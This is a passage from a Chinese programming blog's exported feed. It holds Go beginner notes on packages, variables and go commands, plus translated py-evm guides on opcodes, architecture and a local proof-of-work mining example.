class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">myhellostring = <span class="string">"Yes! Hello World!"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">fmt.Println(<span class="string">"Hello Wolrd?"</span>)</span><br><span class="line">fmt.Print(myhellostring)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Output:</span></span><br><span class="line"><span class="comment">// Hello Wolrd?</span></span><br><span class="line"><span class="comment">// Yes! Hello World!</span></span><br></pre></td></tr></table></figure><h3 id="包概念"><a href="#包概念" class="headerlink" title="包概念"></a>包概念</h3><p>go就是包概念的东西，一个包一个包的组织</p><p><img src="https://i.loli.net/2019/09/23/exjNqf4Kiwk1SC5.png" alt="gosdk内部"></p><p>即使时自己构建的包，也是这样的。一般文件叫啥名字包名就是什么，但是main包是一个特殊包，是入口</p><h3 id="import"><a href="#import" class="headerlink" title="import"></a>import</h3><p>引入包，比如格式化输出包”fmt”，里面有一个特点就是，go的管理很严格，如果引入了包却不用是表示报错的，而不是warnning，如果只是需要引入，那就记得在前面加个下划线，表示不引入包内标识符，只是执行包内的”init”函数。</p><p>还有就是注意路径，这个安装和配置有关系，我在clone go-ethereum的源码的时候，一开始克隆在src目录下，看wiki发现错了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@github.com:nirname/go-ethereum.git <span class="variable">$GOPATH</span>/src/github.com/ethereum/go-ethereum</span><br></pre></td></tr></table></figure><p>就是说，是在src/github.com/ethereum下，这是因为内部代码的import用的是这个路径</p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>特殊的俩函数，init和main，init就相当于c++里面的析构函数吧，跑在所有函数前面，至少before main</p><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>除了普通的一些常规变量，主要说，数组，切片，映射，用户自定义</p><p>变量定义有这么几个小特点</p><ul><li>定义是反着写的，先写变量名，再写类型</li><li>大写的全部变量可以被包外直接访问，小写的不可以，有点像public和protected的区别，但是虽然不能直接访问，但是可以间接读取到</li><li>初始化并定义的符号”:=”</li><li>默认值为零值，可以是nil（go的null），可以是””，可以是0， 可以是false主要看是什么类型</li><li>切片是go一个非常特别的变量，不多说，可以认为是一种特殊的动态数组？</li><li>切片的拷贝和追加都是非常有趣的知识点</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Array</span></span><br><span class="line">array := [<span class="number">5</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">9</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//切片，切片有容量和大小的区别，容量=maxsize，大小=实际大小？</span></span><br><span class="line">slice := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">5</span>)</span><br><span class="line"><span class="comment">//另一种定义方式</span></span><br><span class="line">slice := []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>&#125;</span><br><span class="line">slice := []<span class="keyword">string</span>&#123;<span class="number">99</span> <span class="string">""</span>&#125; <span class="comment">//表示99个空，一个""的切片</span></span><br><span class="line">length := <span class="built_in">len</span>(slice)</span><br><span class="line">maxsize := <span class="built_in">cap</span>(slice)</span><br><span class="line"></span><br><span class="line"><span class="comment">//map</span></span><br><span class="line">dict := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span>)</span><br><span class="line">dict := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>&#123;<span class="string">"g"</span>, <span class="string">"o"</span>&#125;</span><br><span class="line"><span class="comment">//空映射</span></span><br><span class="line">dict := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>&#123;&#125; </span><br><span class="line"><span class="comment">//是一个nil，dict无法填充数据，不同于空映射</span></span><br><span class="line"><span class="keyword">var</span> dict <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span></span><br><span class="line">dict[<span class="number">4</span>] = <span class="string">"fff"</span> <span class="comment">// ERROR</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//self-define</span></span><br><span class="line"><span class="keyword">type</span> user <span class="keyword">struct</span> &#123;</span><br><span class="line">  name <span class="keyword">string</span></span><br><span class="line">  email <span class="keyword">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//self-define</span></span><br><span class="line"><span class="keyword">type</span> user <span class="keyword">struct</span> &#123;</span><br><span class="line">  name <span class="keyword">string</span></span><br><span class="line">  email <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(u user)</span> <span class="title">nofity</span><span class="params">()</span></span>&#123;</span><br><span class="line">  fmt.Println(u.name)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>go的方法不是定义在类型中的，而是依靠”接收者”这个概念绑定的，也就是函数中那个”(u user)”，表示这函数属于user吧</p><h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><p>待</p><h3 id="单元测试"><a href="#单元测试" class="headerlink" title="单元测试"></a>单元测试</h3><p>待</p><h3 id="go模块"><a href="#go模块" class="headerlink" title="go模块"></a>go模块</h3><p>待</p><h2 id="go命令"><a href="#go命令" class="headerlink" title="go命令"></a>go命令</h2><blockquote><p><strong>go build xxx.go</strong></p></blockquote><p>得到一个可执行文件。</p><blockquote><p><strong>go install</strong></p></blockquote><p>功能和 go build 类似，约等于『go build + 把编译后的可执行文件放到GOPATH/bin目录下』</p><p>附加参数绝大多数都可以与 go build 通用。</p><p>go install 只是将编译的中间文件放在 GOPATH 的 pkg 目录下，以及固定地将编译结果放在 GOPATH 的 bin 目录下。</p><p>总结 go install 的编译过程有如下规律：</p><ul><li>go install 是建立在 GOPATH 上的，无法在独立的目录里使用 go install。</li><li>GOPATH 下的 bin 目录放置的是使用 go install 生成的可执行文件，可执行文件的名称来自于编译时的包名。</li><li>go install 输出目录始终为 GOPATH 下的 bin 目录，无法使用<code>-o</code>附加参数进行自定义。</li><li>GOPATH 下的 pkg 目录放置的是编译期间的中间文件。</li></ul><blockquote><p><strong>go get</strong></p></blockquote><p>git clone + go install，如果碰到无法下载的问题，可能是因为，你懂的，找github替代包或者修改hosts</p><h2 id="其他有意思的"><a href="#其他有意思的" class="headerlink" title="其他有意思的"></a>其他有意思的</h2><p><a href="https://www.cnblogs.com/hitandrew/p/5802521.html" target="_blank" rel="noopener">CLI:使用Go开发命令行应用</a></p><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> Programming </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>py-evm之Guides翻译-创建操作码</title>
      <link href="/2019/06/08/py-evm-guides-4/"/>
      <url>/2019/06/08/py-evm-guides-4/</url>
      
        <content type="html"><![CDATA[<!-- build time:Mon Apr 20 2020 11:02:23 GMT+0800 (中国标准时间) --><p>py-evm系列译文，有不当之处请联系改正，原文如下：<a href="https://py-evm.readthedocs.io/en/latest/guides/creating_opcodes.html" target="_blank" rel="noopener">https://py-evm.readthedocs.io/en/latest/guides/creating_opcodes.html</a></p><p>py-evm系列译文之2-Guides翻译4：创建操作码</p><a id="more"></a><h1 id="创建操作码"><a href="#创建操作码" class="headerlink" title="创建操作码"></a>创建操作码</h1><p>操作码只是一个以<a href="https://py-evm.readthedocs.io/en/latest/api/vm/api.vm.computation.html#eth.vm.computation.BaseComputation" target="_blank" rel="noopener"><code>BaseComputation</code></a> 实例作为唯一参数的函数。如果操作码函数具有返回值，则在正常VM执行期间将丢弃该值。</p><p>这是一些简单的例子。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">noop</span><span class="params">(computation)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    一个无所事事的操作码 (甚至不消耗gas)</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">burn_5_gas</span><span class="params">(computation)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    一个只是简单消耗5gas的操作码</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    computation.consume_gas(<span class="number">5</span>, reason=<span class="string">'吃你5 gas 咋滴？'</span>)</span><br></pre></td></tr></table></figure><h2 id="as-opcode-助手"><a href="#as-opcode-助手" class="headerlink" title="as_opcode()助手"></a><a href="https://py-evm.readthedocs.io/en/latest/guides/creating_opcodes.html#eth.vm.opcode.as_opcode" target="_blank" rel="noopener"><code>as_opcode()</code></a>助手</h2><p>虽然这些示例表明了<em>简单的</em>逻辑，但操作码传统来说有一种固有的gas成本。Py-EVM提供了一种抽象，允许将气体消耗与操作码逻辑分离，这对于操作码的gas成本在不同VM规则之间变化但其逻辑保持不变的情况非常方便。</p><blockquote><p><strong>eth.vm.opcode.as_opcode</strong>（<em>logic_fn<em>，</em>mnemonic<em>，</em>gas_cost</em> ）</p></blockquote><ul><li><code>logic_fn</code>参数应该是一个可调用的符合API操作码<strong>的函数调用？（这里有点疑惑）</strong>，采取<em>~eth.vm.computation.Computation</em>实例作为其唯一的参数。</li><li><code>mnemonic</code>是一个字符串，如<code>&#39;ADD&#39;</code>或<code>&#39;MUL&#39;</code>。</li><li><code>gas_cost</code>是执行此操作码的gas成本</li></ul><p>返回值是一个执行<code>logic_fn</code>之前将消耗的<code>gas_cost</code>的函数<strong>(？？？)</strong></p><p><a href="https://py-evm.readthedocs.io/en/latest/guides/creating_opcodes.html#eth.vm.opcode.as_opcode" target="_blank" rel="noopener"><code>as_opcode()</code></a>助手的用法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">custom_op</span><span class="params">(computation)</span>:</span></span><br><span class="line">    ... <span class="comment"># 操作码逻辑</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ExampleComputation</span><span class="params">(BaseComputation)</span>:</span></span><br><span class="line">    opcodes = &#123;</span><br><span class="line">        <span class="string">b'\x01'</span>: as_opcode(custom_op, <span class="string">'CUSTOM_OP'</span>, <span class="number">10</span>),</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="操作码作为类"><a href="#操作码作为类" class="headerlink" title="操作码作为类"></a>操作码作为类</h2><p>有时，将操作码作为类，在相似的操作码之间共享通用逻辑，或跨多个fork规则使用相同的操作码时可能会有所帮助。在这些情况下，将操作码作为类实现<em>可能</em>是正确的选择。这就像<code>__call__</code>在类上实现符合操作码API 的方法一样简单，将单个<code>Computation</code>实例作为唯一参数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyOpcode</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">initial_logic</span><span class="params">(self, computation)</span>:</span></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main_logic</span><span class="params">(self, computation)</span>:</span></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cleanup_logic</span><span class="params">(self, computation)</span>:</span></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self, computation)</span>:</span></span><br><span class="line">        self.initial_logic(computation)</span><br><span class="line">        self.main_logic(computation)</span><br><span class="line">        self.cleanup_logic(computation)</span><br></pre></td></tr></table></figure><p>利用这种模式，可以重复使用整体结构以及大部分逻辑，同时仍然允许一种机制来覆盖操作码逻辑的各个部分。</p><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> BlockChain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ethereum </tag>
            
            <tag> py-evm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>py-evm之Guides翻译-架构</title>
      <link href="/2019/06/07/py-evm-guides-2/"/>
      <url>/2019/06/07/py-evm-guides-2/</url>
      
        <content type="html"><![CDATA[<!-- build time:Mon Apr 20 2020 11:02:23 GMT+0800 (中国标准时间) --><p>py-evm系列译文，有不当之处请联系改正，原文如下：<a href="https://py-evm.readthedocs.io/en/latest/guides/architecture.html" target="_blank" rel="noopener">https://py-evm.readthedocs.io/en/latest/guides/architecture.html</a></p><p>py-evm系列译文之2-Guides翻译2：py-evm架构</p><a id="more"></a><h1 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h1><p>Py-EVM的主要用例是支持公共以太坊区块链。</p><p>但是，它的架构主要集中在可配置性和可扩展性上。在没有对核心库进行任何更改的情况下，应该可以将Py-EVM用于诸如私有链，联盟链甚至具有根本不同的VM语义的链的替代用例。</p><p>以下抽象用于表示基于Py-EVM的区块链的完整共识规则。</p><ul><li>链：用于与区块链交互的高级API。</li><li>虚拟机：Chain中单个fork的高级API，(我理解的fork应该是分叉的意思)</li><li>VMState：VM的当前状态，事务执行逻辑和状态转换函数。</li><li>消息：表示与VM执行相关的事务部分。</li><li>计算：VM执行的计算状态和结果。</li><li>操作码：单个操作码的逻辑。</li></ul><h2 id="链"><a href="#链" class="headerlink" title="链"></a>链</h2><p>术语<strong>链（Chain）</strong>用于封装：</p><ul><li>状态转换功能（例如VM操作码和执行逻辑）</li><li>协议规则（例如块奖励，头奖励，难度计算，交易执行）</li><li>链数据（例如<strong>头</strong>，<strong>区块</strong>，<strong>交易</strong>和<strong>收据</strong>）</li><li>状态数据（例如<strong>余额</strong>，<strong>随机数</strong>，<strong>代码</strong>和<strong>存储</strong>）</li><li>链状态（例如跟踪链头，规范块）</li></ul><blockquote><p>！注意</p><p>虽然链用于<em>包装</em>这些概念，但其中许多实际上是在较低层定义的，例如底层<strong>虚拟机</strong>。</p></blockquote><p>所述<code>Chain</code>对象本身主要是一个接口和协调层。大多数<code>Chain</code>API仅仅作为适当的传递 <code>VM</code>。</p><p>链具有一个或多个底层<strong>虚拟机</strong>或VM。该链包含一个映射，该映射定义哪个VM应对哪些块有效。</p><p>公共主网以太坊区块链的链将为每个fork规则集定义一个单独的VM（例如<strong>Frontier</strong>，<strong>Homestead</strong>，<strong>Tangerine Whistle</strong>， <strong>Spurious Dragon</strong>，<strong>Byzantium</strong>）。</p><h2 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h2><p>术语<strong>虚拟机（VM）</strong>用于封装：</p><ul><li>单个fork规则集的状态转换函数。</li><li>用于事务执行的编排逻辑。</li><li>区块的构建和验证。</li><li>链数据存储和检索API</li></ul><p>该<code>VM</code>对象松散地映射了许多Chain API，用于检索链状态，例如块，头，事务和收据。它还负责块级协议逻辑，例如块创建和验证。</p><h2 id="VMState"><a href="#VMState" class="headerlink" title="VMState"></a>VMState</h2><p>术语<strong>VMState</strong>用于封装：</p><ul><li>VM的执行上下文（例如<code>coinbase</code>或<code>gas_limit</code>）</li><li>状态根定义当前VM状态。</li><li>一些块验证</li></ul><h2 id="消息"><a href="#消息" class="headerlink" title="消息"></a>消息</h2><p>术语<strong>消息（Message）</strong>来自于黄皮书。它封装了启动VM最外层执行所需的事务信息。</p><ul><li>一些参数像<code>sender</code>，<code>value</code>，<code>to</code></li></ul><p>消息可以被视为事务在VM的内部表示。</p><h2 id="计算"><a href="#计算" class="headerlink" title="计算"></a>计算</h2><p>术语<strong>计算（Computation）</strong>用于封装：</p><ul><li>VM执行期间的计算状态（例如内存，堆栈，gas计量）</li><li>VM执行的计算结果（例如返回数据，gas消耗和退款，执行错误）</li></ul><p>该抽象是实现操作码逻辑的接口。</p><h2 id="操作码"><a href="#操作码" class="headerlink" title="操作码"></a>操作码</h2><p>术语<strong>操作码（opcode）</strong>被用于封装：</p><ul><li>VM中的单个指令，例如<code>ADD</code>或<code>MUL</code>操作码。</li></ul><p>操作码以TODO实现。</p><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> BlockChain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ethereum </tag>
            
            <tag> py-evm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>py-evm之Guides翻译-理解挖矿过程</title>
      <link href="/2019/06/07/py-evm-guides-3/"/>
      <url>/2019/06/07/py-evm-guides-3/</url>
      
        <content type="html"><![CDATA[<!-- build time:Mon Apr 20 2020 11:02:23 GMT+0800 (中国标准时间) --><p>py-evm系列译文，有不当之处请联系改正，原文如下：<a href="https://py-evm.readthedocs.io/en/latest/guides/understanding_the_mining_process.html" target="_blank" rel="noopener">https://py-evm.readthedocs.io/en/latest/guides/understanding_the_mining_process.html</a></p><p>py-evm系列译文之2-Guides翻译3：理解挖矿过程，主要是介绍了创建了一个非常非常低难度的链，然后模拟挖掘了一个空块以及一个包含0值交易的块的挖掘</p><a id="more"></a><p>注：<strong>挖矿</strong>和<strong>挖掘</strong>在这篇文章里是一个意思</p><h1 id="理解挖矿过程"><a href="#理解挖矿过程" class="headerlink" title="理解挖矿过程"></a>理解挖矿过程</h1><p>从<a href="https://py-evm.readthedocs.io/en/latest/cookbook/index.html" target="_blank" rel="noopener">Cookbook</a>我们已经可以学习如何使用<a href="https://py-evm.readthedocs.io/en/latest/api/api.chain.html#eth.chains.base.Chain" target="_blank" rel="noopener"><code>Chain</code></a>该类创建单个区块链，作为不同块的不同虚拟机的组合。</p><p>在本指南中，我们希望建立在这些知识上并研究实际的挖掘过程。</p><blockquote><p>！注意</p><p>挖矿是一个过载的术语，事实上，所提到的API的名称可能会发生变化。</p></blockquote><h2 id="挖矿"><a href="#挖矿" class="headerlink" title="挖矿"></a>挖矿</h2><p>根据我们的观点，<em>挖矿</em>这个术语可以指不同的东西。大多数时候，当我们阅读有关<em>挖矿的内容时</em>，我们会认为这是一个多个方<em>竞争</em>成为第一个创建新的有效块并将其传递到网络的过程。</p><p>在本指南中，当我们讨论 <code>mine_block()</code>API时，我们只是指创建，验证和设置块作为链的新规范头部的部分，但它不一定是所提到的竞争为第一的一部分。实际上，当我们导入其他人创建的现有块时，内部也会调用<code>mine_block()</code>API。</p><h2 id="挖掘空块"><a href="#挖掘空块" class="headerlink" title="挖掘空块"></a>挖掘空块</h2><p>通常当我们考虑创建块时，我们自然会考虑首先向块添加事务，因为，毕竟，以太坊区块链的一个主要用例是处理以块为单位的 <em>事务</em>。</p><p>但是为了简单起见，我们将挖掘一个空块作为第一个例子（意味着该块不包含任何事务）</p><p>作为回顾，下面演示我们如何创建一个链，正如cookbook <a href="https://py-evm.readthedocs.io/en/latest/cookbook/index.html#evm-cookbook-recipe-using-the-chain-object" target="_blank" rel="noopener">使用链对象</a> 中所示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> eth.db.atomic <span class="keyword">import</span> AtomicDB</span><br><span class="line"><span class="keyword">from</span> eth.chains.mainnet <span class="keyword">import</span> MAINNET_GENESIS_HEADER</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提高gas限制</span></span><br><span class="line">genesis_header = MAINNET_GENESIS_HEADER.copy(gas_limit=<span class="number">3141592</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化一条新链</span></span><br><span class="line">chain = chain_class.from_genesis_header(AtomicDB(), genesis_header)</span><br></pre></td></tr></table></figure><p>由于我们决定不向我们的块添加任何事务，所以我们只需调用 <code>mine_block()</code>并查看会发生什么。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 初始化一条新链</span></span><br><span class="line">chain = chain_class.from_genesis_header(AtomicDB(), genesis_header)</span><br><span class="line"></span><br><span class="line">chain.mine_block()</span><br></pre></td></tr></table></figure><p>我们遇到了例外<code>check_pow()</code>。显然，我们正在尝试向不符合工作量证明（PoW）规则的链添加块。该错误准确地告诉我们<code>mix_hash</code>我们的块与预期值不匹配。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"scripts/benchmark/run.py"</span>, line <span class="number">111</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    run()</span><br><span class="line">  File <span class="string">"scripts/benchmark/run.py"</span>, line <span class="number">52</span>, <span class="keyword">in</span> run</span><br><span class="line">    block = chain.mine_block()  <span class="comment">#**pow_args</span></span><br><span class="line">  File <span class="string">"/py-evm/eth/chains/base.py"</span>, line <span class="number">545</span>, <span class="keyword">in</span> mine_block</span><br><span class="line">    self.validate_block(mined_block)</span><br><span class="line">  File <span class="string">"/py-evm/eth/chains/base.py"</span>, line <span class="number">585</span>, <span class="keyword">in</span> validate_block</span><br><span class="line">    self.validate_seal(block.header)</span><br><span class="line">  File <span class="string">"/py-evm/eth/chains/base.py"</span>, line <span class="number">622</span>, <span class="keyword">in</span> validate_seal</span><br><span class="line">    header.mix_hash, header.nonce, header.difficulty)</span><br><span class="line">  File <span class="string">"/py-evm/eth/consensus/pow.py"</span>, line <span class="number">70</span>, <span class="keyword">in</span> check_pow</span><br><span class="line">    encode_hex(mining_output[<span class="string">b'mix digest'</span>]), encode_hex(mix_hash)))</span><br><span class="line"></span><br><span class="line">eth.exceptions.ValidationError: mix hash mismatch;</span><br><span class="line"><span class="number">0x7a76bbf0c8d0e683fafa2d7cab27f601e19f35e7ecad7e1abb064b6f8f08fe21</span> !=</span><br><span class="line"><span class="number">0x0000000000000000000000000000000000000000000000000000000000000000</span></span><br></pre></td></tr></table></figure><p>让我们来看看如何<code>check_pow()</code>实现。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_pow</span><span class="params">(block_number: int,</span></span></span><br><span class="line"><span class="function"><span class="params">              mining_hash: Hash32,</span></span></span><br><span class="line"><span class="function"><span class="params">              mix_hash: Hash32,</span></span></span><br><span class="line"><span class="function"><span class="params">              nonce: bytes,</span></span></span><br><span class="line"><span class="function"><span class="params">              difficulty: int)</span> -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">    validate_length(mix_hash, <span class="number">32</span>, title=<span class="string">"Mix Hash"</span>)</span><br><span class="line">    validate_length(mining_hash, <span class="number">32</span>, title=<span class="string">"Mining Hash"</span>)</span><br><span class="line">    validate_length(nonce, <span class="number">8</span>, title=<span class="string">"POW Nonce"</span>)</span><br><span class="line">    cache = get_cache(block_number)</span><br><span class="line">    mining_output = hashimoto_light(</span><br><span class="line">        block_number, cache, mining_hash, big_endian_to_int(nonce))</span><br><span class="line">    <span class="keyword">if</span> mining_output[<span class="string">b'mix digest'</span>] != mix_hash:</span><br><span class="line">        <span class="keyword">raise</span> ValidationError(</span><br><span class="line">            <span class="string">"mix hash mismatch; expected: &#123;&#125; != actual: &#123;&#125;. "</span></span><br><span class="line">            <span class="string">"Mix hash calculated from block #&#123;&#125;, mine hash &#123;&#125;, nonce &#123;&#125;, difficulty &#123;&#125;, "</span></span><br><span class="line">            <span class="string">"cache hash &#123;&#125;"</span>.format(</span><br><span class="line">                encode_hex(mining_output[<span class="string">b'mix digest'</span>]),</span><br><span class="line">                encode_hex(mix_hash),</span><br><span class="line">                block_number,</span><br><span class="line">                encode_hex(mining_hash),</span><br><span class="line">                encode_hex(nonce),</span><br><span class="line">                difficulty,</span><br><span class="line">                encode_hex(keccak(cache)),</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    result = big_endian_to_int(mining_output[<span class="string">b'result'</span>])</span><br><span class="line">    validate_lte(result, <span class="number">2</span>**<span class="number">256</span> // difficulty, title=<span class="string">"POW Difficulty"</span>)</span><br></pre></td></tr></table></figure><p>只需查看该函数的签名，我们就可以看到验证PoW基于以下参数：</p><ul><li><code>block_number</code> - 给定块的编号</li><li><code>difficulty</code> - PoW算法的难度</li><li><code>mining_hash</code> - 挖掘头的哈希值</li><li><code>mix_hash</code> - 与<code>nonce</code>表格一起提供实际证明</li><li><code>nonce</code> - 与<code>mix_hash</code>表格一起提供实际证明</li></ul><p>PoW算法检查所有这些参数是否正确匹配，确保只能将有效块添加到链中。</p><p>为了产生有效的块，我们要在头部设置正确的 <code>mix_hash</code>、<code>nonce</code> 。当我们调用时 <code>mine_block()</code>，我们可以将这些作为键值对传递给该函数，如下所示。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chain.mine_block(nonce=valid_nonce, mix_hash=valid_mix_hash)</span><br></pre></td></tr></table></figure><p>假设我们传递正确的<code>nonce</code>，<code>mix_hash</code>并且对应于被挖掘的块，此调用将正常工作。</p><h2 id="检索有效的随机数并混合哈希"><a href="#检索有效的随机数并混合哈希" class="headerlink" title="检索有效的随机数并混合哈希"></a>检索有效的随机数并混合哈希</h2><p>现在我们知道我们可以调用<code>mine_block()</code> 正确的参数来成功地向我们的链添加一个块，让我们简单地回顾一个示例，演示如何检索匹配 <code>nonce</code>和<code>mix_hash</code>。</p><blockquote><p>！注意</p><p>Py-EVM目前没有为实际的PoW挖掘提供稳定的API。以下代码仅用于演示目的。</p></blockquote><p>在主链矿业是许多矿工同时进行竞争，因此 <em>开采难度</em>是相当高的，这意味着，在商用硬件上它需要很长的时间才能找到合适的 <code>nonce</code> 和 <code>mix_hash</code>。为了让我们能够在常规笔记本电脑上修改一些东西（也就是挖矿），我们将构建一个难度值（difficulty）设置为<code>1</code>的测试链。</p><p>让我们从定义<code>GENESIS_PARAMS</code>开始吧。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> eth <span class="keyword">import</span> constants</span><br><span class="line"></span><br><span class="line">GENESIS_PARAMS = &#123;</span><br><span class="line">      <span class="string">'parent_hash'</span>: constants.GENESIS_PARENT_HASH,</span><br><span class="line">      <span class="string">'uncles_hash'</span>: constants.EMPTY_UNCLE_HASH,</span><br><span class="line">      <span class="string">'coinbase'</span>: constants.ZERO_ADDRESS,</span><br><span class="line">      <span class="string">'transaction_root'</span>: 